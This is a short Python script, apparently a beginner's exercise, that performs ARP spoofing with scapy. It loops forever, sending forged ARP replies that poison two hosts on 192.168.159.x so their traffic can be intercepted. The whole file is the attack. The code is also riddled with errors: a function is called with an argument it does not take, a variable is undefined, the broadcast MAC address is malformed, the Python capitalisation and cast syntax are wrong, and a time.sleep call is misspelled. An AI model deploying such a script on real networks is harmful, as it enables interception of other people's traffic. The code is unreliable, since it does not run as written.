#!/usr/bin/env python

import scapy.all as scapy
import time 

def get_mac(): 
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff::ff") 
    arp_request_broadcast = broadcast/arp_request  
    answerd_list = scapy.srp(arp_request_broadcast,timeout=1, verbose=false)[0] 
    
    return answerd_list[0][1].hwsrc 
    
def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip) 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) #  this is set arp class
    scapy.send(packet, verbose=False) 
    
sent_packet_count = 0 # this is a create a variable and set value 0 in    
while true: 
    spoof("192.168.159.1","192.168.159.2") 
    spoof("192.168.159.2","192.168.159.1") 
    sent_packet_count = set_packet_count + 2 ## this increment the two values.
    print("[+] send the packet " + (str)sent_packet_count) # this use for casting because python generated string related error 
    sleep.time(2) 
    
 
    